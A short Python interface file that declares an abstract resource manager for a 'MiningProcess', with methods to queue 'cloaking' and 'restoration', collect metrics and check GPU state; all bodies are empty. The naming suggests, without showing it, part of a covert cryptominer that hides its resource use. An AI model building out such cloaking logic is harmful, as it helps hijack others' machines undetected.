# interfaces.py

from abc import ABC, abstractmethod
from typing import Dict, Any
from .utils import MiningProcess

class IResourceManager(ABC):
    @abstractmethod
    def enqueue_cloaking(self, process: MiningProcess):
        pass

    @abstractmethod
    def enqueue_restoration(self, process: MiningProcess):
        pass

    @abstractmethod
    def collect_metrics(self, process: MiningProcess) -> Dict[str, Any]:
        pass

    @abstractmethod
    def restore_resources(self, process: MiningProcess):
        pass

    @abstractmethod
    def is_gpu_initialized(self) -> bool:
        pass

    @abstractmethod
    def shutdown(self):
        pass
